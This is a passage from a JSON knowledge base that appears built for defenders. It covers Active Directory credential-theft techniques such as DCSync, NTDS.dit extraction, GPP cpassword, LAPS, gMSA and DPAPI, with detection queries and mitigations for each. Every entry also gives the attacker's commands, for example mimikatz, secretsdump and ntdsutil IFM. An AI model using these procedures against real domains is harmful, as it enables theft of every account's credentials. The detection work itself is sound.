SECURITY+SYSTEM hives. Live: mimikatz lsadump::secrets. This yields service account cleartext passwords, DefaultPassword (autologon), $MACHINE.ACC, _SC_<service>, etc., leading directly to domain service account takeover and lateral movement.","tools":"impacket-secretsdump, mimikatz lsadump::secrets, NetExec --lsa, reg save","detect":"Access to the SECURITY hive (4656/4663 SACL), reg save SECURITY command lines. Service creation 7045 / RemoteRegistry access on remote execution. Correlate anomalous authentication following exposure of service account cleartext.","events":"4688/Sysmon 1, 4656/4663, 7045","mitigate":"Migrate services to gMSA/MSA to eliminate cleartext password storage. Retire autologon (DefaultPassword). Strong service account passwords + rotation. Suppress privilege escalation and use EDR.","triage":"On the target host pull `reg save` of the SECURITY hive (4688/Sysmon EID 1) plus 4656/4663 access to SECURITY+SYSTEM hives. For remote secretsdump correlate RemoteRegistry start, 7045, and 4624 LogonType3 to ADMIN$; it is black if LSA-secret service accounts or $MACHINE.ACC then authenticate abnormally elsewhere (4624/4769). Scheduled backup/migration or an authenticated vulnerability scanner (Nessus) from a known account with no follow-on lateral movement leans benign.","hunt":[{"plat":"MDE","t":"reg save SECURITY / secretsdump artifacts = black / legit maintenance = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where (FileName =~ \"reg.exe\" and ProcessCommandLine has \"save\" and ProcessCommandLine has \"security\")\n   or ProcessCommandLine has_any (\"lsadump::secrets\", \"secretsdump\", \"-security\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"},{"plat":"Sentinel","t":"service creation (7045) from remote secretsdump = black / normal service install = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 7045\n| where ServiceName matches regex @\"^[A-Za-z0-9]{8}$\" or ServiceName has_any (\"RemoteRegistry\", \"psexec\", \"tmp\")\n| project TimeGenerated, Computer, Account, ServiceName, ProcessName\n| summarize Svcs=make_set(ServiceName), n=count() by Computer, Account, bin(TimeGenerated, 1h)\n| where n > 0"}],"huntcs":[{"plat":"Event Search","t":"reg.exe save of the SECURITY hive = black / one-off LSA-secrets grab is high-suspicion; only scoped ops = white","q":"event_simpleName=ProcessRollup2 FileName=reg.exe CommandLine=\"*save*\" CommandLine=\"*security*\"\n| stats count by ComputerName, UserName, ParentBaseFileName, CommandLine\n| sort - count"}]},{"name":"Cached Domain Credentials Dump (MSCACHEv2/DCC2)","aka":"mscash2 / cachedump / lsadump::cache","phase":"credaccess","group":"Host / Local","mitre":"T1003.005","cve":"","sev":"High","summary":"Extract domain credentials cached locally for offline logon when a DC is unreachable (MSCACHEv2 hashes) and crack them offline.","how":"Prereq: local admin. impacket secretsdump.py outputs $DCC2$-format cache from the SECURITY+SYSTEM hives, or mimikatz lsadump::cache. MSCACHEv2 cannot be used for PtH, but offline dictionary/brute-force is possible with hashcat -m 2100. Targets cleartext recovery of recently logged-on domain users (especially privileged ones). Last 10 entries cached by default.","tools":"impacket-secretsdump, mimikatz lsadump::cache, cachedump, hashcat -m 2100","detect":"SECURITY hive access (4656/4663). reg save/secretsdump traces. MSCACHEv2 itself generates no network traffic, so focus on correlating hive exfiltration with offline behavior.","events":"4688/Sysmon 1, 4656/4663","mitigate":"Reduce cache count via GPO (CachedLogonsCount=0-1, trades off availability). Do not let privileged accounts interactively log on to general endpoints (prevents cache creation). Strong passphrases improve offline-crack resistance.","triage":"MSCACHEv2 generates no network traffic, so center triage on SECURITY hive access (4656/4663 via SACL) correlated with `reg save SECURITY`/secretsdump/cachedump command lines (4688/Sysmon EID 1) on the target host. Black if a hive is exported (Sysmon EID 11) then hashcat -m 2100 artifacts appear offline. It leans benign when a forensic tool or backup product exports SYSTEM+SECURITY through a sanctioned procedure with no subsequent exfiltration or cracking; note that without SACLs you rely on command-line auditing.","hunt":[{"plat":"MDE","t":"cachedump/lsadump::cache extracting DCC2 = black / harmless SECURITY read = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"lsadump::cache\", \"cachedump\", \"mscash\", \"secretsdump\")\n   or (FileName =~ \"reg.exe\" and ProcessCommandLine has \"save\" and ProcessCommandLine has \"security\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, SHA256"},{"plat":"Sentinel","t":"non-operational handle access to SECURITY hive file = black / normal I/O = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4656, 4663)\n| where ObjectType == \"File\" and ObjectName has \"\\\\config\\\\SECURITY\"\n| summarize Accesses=count(), Procs=make_set(ProcessName) by Account, Computer, bin(TimeGenerated, 1h)\n| where Accesses > 0"}],"huntcs":[{"plat":"LogScale","t":"secretsdump/cachedump/lsadump::cache extracting DCC2 = black / MSCACHEv2 makes no traffic, judged by hive-exfil behavior = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(secretsdump|cachedump|lsadump::cache|-cache|mscash)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=cnt))\n| sort(cnt, order=desc)"}]},{"name":"NTDS.dit Theft via Volume Shadow Copy (VSS)","aka":"vssadmin NTDS.dit / esentutl / diskshadow","phase":"credaccess","group":"Host / Local","mitre":"T1003.003","cve":"","sev":"Critical","summary":"Create a VSS snapshot on a domain controller to copy the locked NTDS.dit and SYSTEM hive, extracting hashes for all domain accounts (including krbtgt).","how":"Prereq: Domain Admin / DC admin on the DC. vssadmin create shadow /for=C: to create a shadow, then copy \\\\?\\GLOBALROOT\\...\\Windows\\NTDS\\NTDS.dit and SYSTEM. Alternatives: diskshadow scripts, esentutl /y /vss, wbadmin, ntdsutil ifm. Extract all hashes offline with secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL or DSInternals. Obtaining the krbtgt hash leads to Golden Ticket.","tools":"vssadmin, diskshadow, esentutl, wbadmin, ntdsutil(ifm), impacket-secretsdump, DSInternals","detect":"Execution of vssadmin create shadow / diskshadow / ntdsutil / esentutl on a DC (4688/Sysmon1). VSS creation events. File access to NTDS.dit / GLOBALROOT paths. Shadow copy operations on a DC are highly suspicious if outside legitimate operations.","events":"4688/Sysmon 1, 8222(VSS), 4656/4663(NTDSアクセス), Sysmon 11","mitigate":"Strictly limit DC logon rights (Tier0). Monitor and alert on vssadmin/ntdsutil execution on DCs. Credential Guard does not cover this, but harden admin takeover itself via DC isolation, PAW, and LAPS/MFA. Perform periodic krbtgt double-reset.","triage":"On the DC pull 4688/Sysmon EID 1 for `vssadmin create shadow`/diskshadow/esentutl /y /vss/wbadmin plus 8222 (VSS)/shadow-creation events. It is black when GLOBALROOT-path access to NTDS.dit and SYSTEM (4656/4663) and a Sysmon EID 11 copy chain to the same admin at the same time. Shadow operations on a DC have few legitimate uses so treat as high suspicion, but an approved Windows Backup/DPM job running on schedule under a known service account, with no external NTDS.dit copy or secretsdump artifacts, is benign.","hunt":[{"plat":"MDE","t":"vssadmin/diskshadow/esentutl grabbing NTDS on a DC = black / non-DC or maintenance = review","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where (FileName =~ \"vssadmin.exe\" and ProcessCommandLine has \"create\" and ProcessCommandLine has \"shadow\")\n   or FileName =~ \"diskshadow.exe\"\n   or (FileName =~ \"esentutl.exe\" and ProcessCommandLine has_any (\"ntds\", \"/vss\", \"/y\"))\n   or ProcessCommandLine has \"GLOBALROOT\"\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"},{"plat":"MDE","t":"ntds.dit copy landing in shadow/temp path = black / legit backup = white","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FileName =~ \"ntds.dit\"\n| where ActionType in (\"FileCreated\", \"FileRenamed\", \"FileModified\")\n| where FolderPath !has \"\\\\Windows\\\\NTDS\\\\\"\n| project Timestamp, DeviceName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, RequestAccountName"}],"huntcs":[{"plat":"LogScale","t":"DC running vssadmin/diskshadow/esentutl against NTDS.dit/GLOBALROOT = black / shadow ops on a DC outside maintenance = black","q":"#event_simpleName=ProcessRollup2\n| FileName=/(vssadmin|diskshadow|esentutl|wbadmin)\\.exe/i\n| CommandLine=/(create.*shadow|ntds\\.dit|GLOBALROOT|copy.*ntds)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=cnt))\n| sort(cnt, order=desc)"}]},{"name":"NTDS.dit Extraction via ntdsutil IFM","aka":"Install From Media / create ifm","phase":"credaccess","group":"Host / Local","mitre":"T1003.003","cve":"","sev":"Critical","summary":"Abuse ntdsutil's 'Install From Media (IFM)' feature -- meant to promote an additional DC (writable DC or RODC) without initial replication over the network -- to export NTDS.dit and the registry together and steal hashes. Uses create full (for writable DCs), which retains secrets, not create rodc (for RODCs, which strips secrets).","how":"Prereq: admin rights on the DC. powershell -c \"ntdsutil 'ac i ntds' 'ifm' 'create full C:\\temp\\ifm' q q\" generates NTDS.dit, SYSTEM, and SECURITY in one pass. Being a legitimate admin tool, AV detection is weak. Exfiltrate the output offline and extract all domain hashes with secretsdump.py -ntds ... -system ... LOCAL.","tools":"ntdsutil.exe, impacket-secretsdump, DSInternals","detect":"ntdsutil.exe execution on a DC with command lines containing 'ifm' / 'create full' (4688/Sysmon1). Creation of a large NTDS.dit directly under C:\\ etc. (Sysmon11). Treat execution outside legitimate DC promotion as highly suspicious and alert immediately.","events":"4688/Sysmon 1, Sysmon 11","mitigate":"Limit interactive operations on DCs to least privilege via PAW. Whitelist and monitor ntdsutil execution. Tier0 isolation; prohibit IFM generation outside change management.","triage":"On the DC alert immediately on 4688/Sysmon EID 1 where `ntdsutil.exe` runs with `ifm`/`create full` in the command line, and confirm a large NTDS.dit written to e.g. C:\\ (Sysmon EID 11). Black if the executing account/parent (via powershell/cmd) plus exfiltration or offline secretsdump chain together. ntdsutil is a legitimate, weakly-detected tool, so it is benign when the run matches a planned DC-promotion/lab-build activity aligned with the operator and a change-management ticket.","hunt":[{"plat":"MDE","t":"ntdsutil ifm/create full dumping NTDS = black / DC promotion work = review","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName =~ \"ntdsutil.exe\"\n| where ProcessCommandLine has_any (\"ifm\", \"create full\", \"create sysvol full\", \"activate instance ntds\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine"},{"plat":"MDE","t":"large ntds.dit written to IFM output (non-NTDS path) = black / none normally = white","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FileName =~ \"ntds.dit\" and ActionType == \"FileCreated\"\n| where FolderPath !has \"\\\\Windows\\\\NTDS\\\\\"\n| where InitiatingProcessFileName in~ (\"ntdsutil.exe\", \"dsdbutil.exe\")\n| project Timestamp, DeviceName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, RequestAccountName"}],"huntcs":[{"plat":"Event Search","t":"ntdsutil with 'ifm'/'create full' producing NTDS.dit = black / anything outside genuine DC promotion = black","q":"event_simpleName=ProcessRollup2 FileName=ntdsutil.exe CommandLine=\"*ifm*\"\n| stats count by ComputerName, UserName, ParentBaseFileName, CommandLine\n| sort - count"}]},{"name":"DCSync (directory replication credential theft)","aka":"lsadump::dcsync / secretsdump remote","phase":"credaccess","group":"Host / Local","mitre":"T1003.006","cve":"","sev":"Critical","summary":"Without physically touching a DC, abuse the directory replication protocol (DRSUAPI/GetNCChanges) to remotely replicate the hashes of any user (including krbtgt).","how":"Prereq: Replicating Directory Changes / All / In Filtered Set rights (default DA/DC/Enterprise Admin; a regular user may hold them due to delegation mistakes). mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt or impacket secretsdump.py -just-dc corp/user@dc. Achieves the equivalent of NTDS.dit theft remotely, leading to Golden Ticket.","tools":"mimikatz lsadump::dcsync, impacket-secretsdump -just-dc, NetExec","detect":"Directory replication event 4662 (GUID: DS-Replication-Get-Changes 1131f6aa/1131f6ad/89e95b76) on a DC originating from a 'non-DC host / regular user'. DRSUAPI (RPC) from a non-DC source IP. Inventory replication-rights holders with BloodHound.","events":"4662, 4624(ログオン相関), ネットワークDRSUAPI","mitigate":"Minimize and inventory holders of replication rights (GetChanges/GetChangesAll). Review delegations. Whitelist replication source IPs from DCs (IPsec/firewall). Alert on 4662 replication GUIDs in the SIEM.","triage":"On the DC pull 4662 where Object Type is the domain root and Properties include DS-Replication-Get-Changes GUIDs (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 / 1131f6ad / 89e95b76); flag when the Account Name is an ordinary user rather than a DC machine account or sanctioned Enterprise/Domain Admin replica source. Use 4624 to locate that account's logon source IP, and if DRSUAPI/RPC comes from a non-DC workstation IP (MDI 'Suspected DCSync attack') for the same account/time, it is black. 4662 from a newly promoted DC, an Azure AD Connect/MSOL_ sync account, or a known replication-monitoring tool on the normal schedule is benign.","hunt":[{"plat":"Sentinel","t":"non-machine/user account hitting DS-Replication GUIDs via 4662 = black / DC self-replication = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has_any (\"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\", \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\", \"89e95b76-444d-4c62-991a-0facbeda640c\")\n| where Account !endswith \"$\"\n| summarize Repls=count() by Account, Computer, bin(TimeGenerated, 1h)\n| where Repls > 0"},{"plat":"MDI","t":"directory replication from a non-DC source = black / legit DC-to-DC replication = white","q":"IdentityDirectoryEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"Directory Services replication\"\n| summarize Repls=count() by AccountName, IPAddress, DeviceName, DestinationDeviceName\n| where Repls > 0"}],"huntcs":[{"plat":"LogScale","t":"attacker host running lsadump::dcsync/secretsdump = black / the 4662 replication event itself is DC-only, invisible to EDR","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(lsadump::dcsync|dcsync.*\\/(user|domain)|secretsdump.*-just-dc)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=cnt))\n| sort(cnt, order=desc)"},{"plat":"Identity Protection","t":"DS-Replication-Get-Changes from a non-DC/normal user = black / Falcon EDR does not collect replication RPC, so use IdP detection","q":"// Falcon Identity Protection detection: DCSync — DS-Replication-Get-Changes(-All) (4662 GUID 1131f6aa-9c07/1131f6ad/89e95b76) requested by a non-DC principal. DC-only DS-Access event; not present in Falcon EDR telemetry."}]},{"name":"GPP cpassword (Group Policy Preferences)","aka":"Groups.xml AES cpassword / Get-GPPPassword","phase":"credaccess","group":"Host / Local","mitre":"T1552.006","cve":"CVE-2014-1812","sev":"High","summary":"Decrypt the cpassword attribute in GPP XML (Groups.xml, etc.) on SYSVOL using the published fixed AES key to obtain local/service account cleartext passwords.","how":"Prereq: any authenticated domain user (SYSVOL is readable by all users). Collect cpassword values from Groups.xml/Services.xml/ScheduledTasks.xml/Drives.xml/DataSources.xml/Printers.xml under \\\\domain\\SYSVOL and decrypt with Microsoft's published fixed AES-256 key. Get-GPPPassword (PowerSploit), gpp-decrypt, impacket Get-GPPPassword.py. If the recovered cleartext is a shared local admin, it leads directly to lateral movement.","tools":"Get-GPPPassword(PowerSploit), gpp-decrypt(Kali), impacket Get-GPPPassword.py, findstr /S cpassword","detect":"Search for cpassword strings in SYSVOL XML. Bulk file access to SYSVOL. Get-GPPPassword execution in the domain (4104). Inventory existing GPP XML.","events":"4104, 5145(共有オブジェクトアクセス, SACL時)","mitigate":"Apply MS14-025 to prevent creation of new GPP passwords. Audit for residual cpassword across SYSVOL with findstr etc. and delete the affected GPP/XML. Immediately rotate exposed credentials. Migrate to LAPS.","triage":"On the DC/SYSVOL server pull 5145 (if SACL set) for RelativeTargetName hitting Groups.xml/Services.xml/ScheduledTasks.xml/Drives.xml etc., and check whether one principal enumerates many SYSVOL XMLs in a short window. Black when the source host's 4104 shows Get-GPPPassword and 4688 shows `findstr /S cpassword` for the same user/time. GPO-editing/audit tools and backups routinely scan SYSVOL, so if any cpassword-bearing XML still exists the environment is already vulnerable; it leans benign only when the reader is a known ops account.","hunt":[{"plat":"MDE","t":"Get-GPPPassword / cpassword decrypt tooling = black / normal GPO editing = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"Get-GPPPassword\", \"cpassword\", \"gpprefdecrypt\", \"Groups.xml\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"},{"plat":"Sentinel","t":"concentrated share access to GPP XML on SYSVOL = black / single legit read = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145 and ShareName has \"SYSVOL\"\n| where RelativeTargetName has_any (\"Groups.xml\", \"Services.xml\", \"ScheduledTasks.xml\", \"Printers.xml\", \"Drives.xml\", \"DataSources.xml\")\n| summarize Reads=count(), Files=make_set(RelativeTargetName) by Account, IpAddress, bin(TimeGenerated, 1h)\n| where Reads > 3"}],"huntcs":[{"plat":"LogScale","t":"Get-GPPPassword/cpassword/Groups.xml access = black / decrypt-tool execution over SYSVOL is not routine = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Get-GPPPassword|cpassword|Groups\\.xml|gpprefdecrypt|SYSVOL.*\\.xml)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=cnt))\n| sort(cnt, order=desc)"}]},{"name":"LAPS Password Read (ms-Mcs-AdmPwd)","aka":"LAPS abuse / Get-LAPSPassword / Windows LAPS","phase":"credaccess","group":"Host / Local","mitre":"T1552","cve":"","sev":"High","summary":"Abuse over-granted read rights to retrieve the cleartext LAPS attribute (ms-Mcs-AdmPwd / msLAPS-Password) from LDAP.","how":"Prereq: a user with ReadProperty (ControlAccess) rights on the target computer object's ms-Mcs-AdmPwd attribute (tends to sprawl via delegation mistakes). Search LDAP for (ms-Mcs-AdmPwdExpirationTime=*) and read ms-Mcs-AdmPwd. Tools: pyLAPS, LAPSDumper, Get-LAPSPasswords, NetExec -M laps, identify the ReadLAPSPassword edge in BloodHound. Windows LAPS supports encryption (DPAPI-NG), but cleartext-storage environments still exist.","tools":"pyLAPS, LAPSDumper, Get-LAPSPasswords(PowerShell), NetExec -M laps, BloodHound","detect":"Reads of the ms-Mcs-AdmPwd attribute (4662, SACL auditing with property GUID specified). LDAP searches of LAPS attributes by unexpected principals. Detect anomalous growth of ReadLAPSPassword holders in BloodHound.","events":"4662(属性アクセス, SACL要), 4624","mitigate":"Inventory ms-Mcs-AdmPwd/msLAPS read ACLs at least privilege (remove delegations). Enable Windows LAPS encryption (DPAPI-NG). Set read-access audit SACLs on all computer OUs. Periodic rotation.","triage":"On the DC pull 4662 where Properties include the ms-Mcs-AdmPwd attribute GUID as ReadProperty (ControlAccess) — requires per-attribute SACL — and check whether the Subject is an expected delegate (helpdesk/PAM). Use 4624 to identify the reading host; black if one principal enumerates ms-Mcs-AdmPwd across many computers or runs a broad (ms-Mcs-AdmPwdExpirationTime=*) LDAP query (correlate with NetExec -M laps/pyLAPS). A single read by an approved privileged admin, the LAPS console, or a just-in-time checkout for an in-scope machine is benign.","hunt":[{"plat":"MDI","t":"ms-Mcs-AdmPwd LDAP query by unexpected principal = black / sanctioned LAPS tooling = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| where Query has_any (\"ms-Mcs-AdmPwd\", \"msMcsAdmPwd\")\n| summarize Reads=count(), Targets=dcount(QueryTarget) by AccountName, DeviceName, IPAddress, bin(Timestamp, 1h)\n| where Reads > 0"},{"plat":"Sentinel","t":"repeated 4662 property access to LAPS attribute GUID = black / expected delegated admin = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662 and ObjectType has \"computer\"\n| where Properties has \"ms-Mcs-AdmPwd\"   // confirm LAPS attribute schemaIDGUID in your tenant SACL\n| where Account !endswith \"$\"\n| summarize Reads=count() by Account, Computer, bin(TimeGenerated, 1h)\n| where Reads > 0"}],"huntcs":[{"plat":"LogScale","t":"attacker host running ms-Mcs-AdmPwd/Get-LAPSPassword readers = black / the 4662 attribute-read is DC-only SACL, invisible to EDR","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(ms-Mcs-AdmPwd|Get-LAPSPassword|Get-AdmPwdPassword|Get-LapsADPassword)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=cnt))\n| sort(cnt, order=desc)"},{"plat":"Identity Protection","t":"ms-Mcs-AdmPwd read by an unexpected principal = black / LDAP attribute read is not collected by EDR, use IdP","q":"// Falcon Identity Protection detection: LAPS password read — 4662 read of ms-Mcs-AdmPwd (property-GUID SACL) by an unexpected principal. DC-only DS-Access; not in Falcon EDR telemetry."}]},{"name":"gMSA Password Retrieval (msDS-ManagedPassword)","aka":"GMSAPasswordReader / gMSADumper / read GMSA blob","phase":"credaccess","group":"Host / Local","mitre":"T1003, T1552","cve":"","sev":"High","summary":"Retrieve a group Managed Service Account (gMSA) msDS-ManagedPassword blob using a principal listed in PrincipalsAllowedToRetrieveManagedPassword and compute the NTLM hash.","how":"Prereq: rights of an account included in the target gMSA's msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword). Read msDS-ManagedPassword via LDAP and parse the MSDS-MANAGEDPASSWORD_BLOB to compute the NTLM hash / AES keys. gMSADumper.py, GMSAPasswordReader.exe, DSInternals (Get-ADReplAccount, etc.). Note: Get-ADServiceAccount is an RSAT AD module cmdlet. Use the recovered hash for Overpass-the-Hash / service impersonation. Identify delegated targets via BloodHound's ReadGMSAPassword edge.","tools":"gMSADumper.py, GMSAPasswordReader, DSInternals, NetExec --gmsa, BloodHound","detect":"LDAP reads of the msDS-ManagedPassword attribute (4662). Retrieval by unexpected principals. Correlate gMSA blob requests over LDAPS on the network side. Audit ReadGMSAPassword holders in BloodHound.","events":"4662(属性アクセス), 4624","mitigate":"Limit PrincipalsAllowedToRetrieveManagedPassword to a minimal set of hosts/services and inventory periodically. Protect the hosts granted the gMSA themselves (Tier separation). Set audit SACLs for anomalous retrieval.","triage":"On the DC pull 4662 where Properties include the msDS-ManagedPassword attribute GUID (LDAP read) and verify the Subject is a legitimate host machine account listed in that gMSA's PrincipalsAllowedToRetrieveManagedPassword (msDS-GroupMSAMembership). Use 4624 to locate the reader; black if a human user or unauthorized principal interactively requests the msDS-ManagedPassword blob (gMSADumper/GMSAPasswordReader artifacts). Routine retrieval of its own password by an approved member server running the gMSA at service start is benign.","hunt":[{"plat":"MDI","t":"msDS-ManagedPassword LDAP read by unexpected principal = black / authorized gMSA host = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| where Query has_any (\"msDS-ManagedPassword\", \"msDS-GroupMSAMembership\")\n| summarize Reads=count(), Targets=make_set(QueryTarget) by AccountName, DeviceName, IPAddress, bin(Timestamp, 1h)\n| where Reads > 0"},{"plat":"Sentinel","t":"4662 access to msDS-ManagedPassword on gMSA object = black / legit member host = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has \"e362ed86-b728-0842-b27d-2dea7a9df218\"   // msDS-ManagedPassword; confirm SACL enabled\n| where Account !endswith \"$\"\n| summarize Reads=count() by Account, Computer, ObjectName, bin(TimeGenerated, 1h)\n| where Reads > 0"}],"huntcs":[{"plat":"LogScale","t":"GMSAPasswordReader/gMSADumper/msDS-ManagedPassword retrieval = black / gMSA blob-decrypt tools are not routine = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(GMSAPasswordReader|gMSADumper|msDS-ManagedPassword|ConvertFrom-ADManagedPasswordBlob)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=cnt))\n| sort(cnt, order=desc)"},{"plat":"Identity Protection","t":"msDS-ManagedPassword LDAP read by an unexpected principal = black / attribute read not collected by EDR, use IdP","q":"// Falcon Identity Protection detection: gMSA password retrieval — 4662 read of msDS-ManagedPassword by an unexpected principal. DC-only DS-Access; not in Falcon EDR telemetry."}]},{"name":"DPAPI Master Key & Credential Blob Theft","aka":"dpapi::masterkey / SharpDPAPI / mimikatz dpapi","phase":"credaccess","group":"Host / Local","mitre":"T1555, T1003.001","cve":"","sev":"High","summary":"Decrypt the master key to plaintext DPAPI-protected user credentials (Credential Manager blobs, RDP, scheduled tasks, etc.).","how":"Prereq: target user session or local admin/DA. User side: decrypt the master key in %APPDATA%\\Microsoft\\Protect\\<SID>\\ with the user password/hash (mimikatz dpapi::masterkey /sid /password or /rpc). Admin side: extract DPAPI master keys from LSASS (sekurlsa::dpapi). Domain-wide: obtaining the DPAPI backup key (domain backup key) on a DC via lsadump::backupkeys allows decrypting every user's master key. Decryption targets are the Credential files in %APPDATA%\\Microsoft\\Credentials\\. Automate with SharpDPAPI.","tools":"mimikatz dpapi::*/sekurlsa::dpapi/lsadump::backupkeys, SharpDPAPI, DonPAPI, impacket dpapi.py","detect":"Access to %APPDATA%\\Microsoft\\Protect and \\Credentials (Sysmon11/4663). Correlate DPAPI backup key retrieval on a DC as anomalous operations via DRSUAPI/LSA. SharpDPAPI/mimikatz execution traces.","events":"4663/Sysmon 11, Sysmon 10(LSASS), 4104","mitigate":"Partial protection via Credential Guard. Strictly protect the DPAPI domain backup key on DCs at Tier0 (theft = decryption for all users). Operationally avoid storing sensitive credentials in Credential Manager. Suppress host compromise and admin takeover themselves.","triage":"On the target host pull Sysmon EID 11/4663 for access to %APPDATA%\\Microsoft\\Protect\\<SID> and \\Credentials by a non-owning/atypical process, and correlate 4104/4688 for SharpDPAPI or mimikatz dpapi::/sekurlsa::dpapi execution. It is black when the DC sees DPAPI domain backup-key retrieval (lsadump::backupkeys-equivalent, abnormal DRSUAPI/LSA operation) followed by mass Credential-file decryption. Routine backup or profile-migration access to the Protect folder, with no backupkeys retrieval or mimikatz artifacts, is benign.","hunt":[{"plat":"MDE","t":"SharpDPAPI/mimikatz DPAPI masterkey command lines. dpapi::/rpc backupkey = malicious / none legitimately = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"dpapi::masterkey\",\"dpapi::cred\",\"masterkeys\",\"/masterkey:\",\"backupkey\",\"/rpc\",\"SharpDPAPI\")\n| where not(InitiatingProcessFileName in~ (\"MsMpEng.exe\"))\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine\n| order by Timestamp desc"},{"plat":"MDE","t":"Non-standard process touching many files under \\Microsoft\\Protect / \\Credentials = malicious / lsass-driven access = benign","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FolderPath has_any (@\"\\Microsoft\\Protect\", @\"\\Microsoft\\Credentials\")\n| where InitiatingProcessFileName !in~ (\"svchost.exe\",\"lsass.exe\",\"explorer.exe\",\"dllhost.exe\",\"System\")\n| summarize cnt=count(), paths=make_set(FolderPath,10) by DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName\n| where cnt > 3"}],"huntcs":[{"plat":"Event Search","t":"SharpDPAPI/mimikatz dpapi or Protect/Credentials path access; masterkey decrypt=bad / rare legit backup=white.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*dpapi::masterkey*\" OR CommandLine=\"*dpapi::cred*\" OR CommandLine=\"*SharpDPAPI*\" OR CommandLine=\"*\\\\Microsoft\\\\Protect*\" OR CommandLine=\"*\\\\Microsoft\\\\Credentials*\")\n| stats count, values(CommandLine) as cmds by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"}]},{"name":"DPAPI Browser Credential/Cookie Theft","aka":"Chrome/Edge Login Data / cookies / SharpChrome","phase":"credaccess","group":"Host / Local","mitre":"T1555.003","cve":"","sev":"High","summary":"Decrypt the DPAPI-encrypted AES state key (Local State) of Chromium-based browsers to plaintext saved passwords/cookies and hijack sessions.","how":"Prereq: target user context or local admin. Decrypt the encrypted_key in %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State with DPAPI to obtain the AES-GCM key, then decrypt the v10/v11 blobs in Login Data/Cookies (SQLite). SharpChrome, DonPAPI, LaZagne, HackBrowserData. In environments with Chrome App-Bound Encryption (v20), an additional decryption method via IElevator COM is required. Cookie theft enables MFA bypass (session hijacking).","tools":"SharpChrome, LaZagne, HackBrowserData, DonPAPI, mimikatz dpapi::chrome","detect":"Access to browser profiles (Login Data/Cookies/Local State) from non-browser processes (Sysmon11/4663). Execution of LaZagne, etc. Session reuse from anomalous geo/device (IdP side).","events":"4663/Sysmon 11, 4688, IdP認証ログ","mitigate":"Enable the browser's App-Bound Encryption. Monitor access to sensitive browser files via endpoint EDR. On the IdP side, invalidate cookie reuse with continuous access evaluation / short-lived sessions / device binding. Prohibit browser credential storage for privileged users.","triage":"On the target host pull Sysmon EID 11/4663 for access to Login Data/Cookies/Local State under %LOCALAPPDATA%\\Google\\Chrome\\User Data by processes other than chrome.exe/msedge.exe, and correlate 4688 for SharpChrome/LaZagne/HackBrowserData. Black when an external process opens the SQLite/Local State while the browser is not running and the IdP logs then show session/cookie reuse from an anomalous geo/device (MFA-bypass sign). Routine access by a signed EDR/DLP/backup agent or the browser's own profile sync, with no session anomaly, is benign.","hunt":[{"plat":"MDE","t":"Non-browser process opening Login Data/Cookies/Local State = malicious (SharpChrome/LaZagne) / the browser itself = benign","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FolderPath has @\"\\User Data\\\"\n| where FileName in~ (\"Login Data\",\"Cookies\",\"Local State\",\"Web Data\",\"Login Data For Account\")\n| where InitiatingProcessFileName !in~ (\"chrome.exe\",\"msedge.exe\",\"brave.exe\",\"firefox.exe\",\"opera.exe\",\"vivaldi.exe\")\n| summarize hits=make_set(FileName,20), cnt=count() by DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName\n| where cnt > 